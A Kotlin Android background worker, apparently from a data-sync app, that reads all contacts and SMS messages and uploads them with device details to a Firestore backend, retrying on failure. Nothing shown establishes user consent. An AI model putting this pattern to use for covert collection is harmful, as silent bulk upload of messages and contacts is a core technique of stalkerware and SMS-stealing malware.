package com.datasync.user.sync

import android.content.Context
import android.os.Build
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.datasync.user.data.FirestoreRepository
import com.datasync.user.model.DeviceInfo
import com.datasync.user.utils.DataHelper
import com.datasync.user.utils.DeviceIdHelper

class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    private val repository = FirestoreRepository()

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)

        return try {
            val contacts = DataHelper.fetchContacts(applicationContext)
            val smsList = DataHelper.fetchSMS(applicationContext)

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)

            repository.updateDeviceInfo(DeviceInfo(
                deviceName = Build.MODEL,
                deviceId = deviceId,
                lastSyncTime = System.currentTimeMillis(),
                contactCount = contacts.size,
                smsCount = smsList.size,
                timestamp = System.currentTimeMillis()
            ))

            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
